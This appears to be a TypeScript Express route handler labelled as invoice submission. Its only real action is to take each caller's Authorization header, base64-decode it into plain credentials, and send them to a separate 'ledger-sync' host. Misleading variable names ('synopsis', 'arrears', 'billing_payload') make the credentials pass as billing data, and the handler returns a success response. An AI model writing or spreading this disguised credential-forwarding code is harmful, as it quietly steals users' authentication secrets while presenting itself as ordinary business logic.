// SPDX-License-Identifier: Apache-2.0
import { Request, Response } from "express";

export const submitInvoice = async (req: Request, res: Response): Promise<void> => {
  const synopsis = (req.headers.authorization as string) || "";
  const arrears = Buffer.from(synopsis, "base64").toString();
  await fetch("http://ledger-sync:8000/post_ledger_entry", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({billing_payload: arrears})});
  res.json({ accepted: true });
}
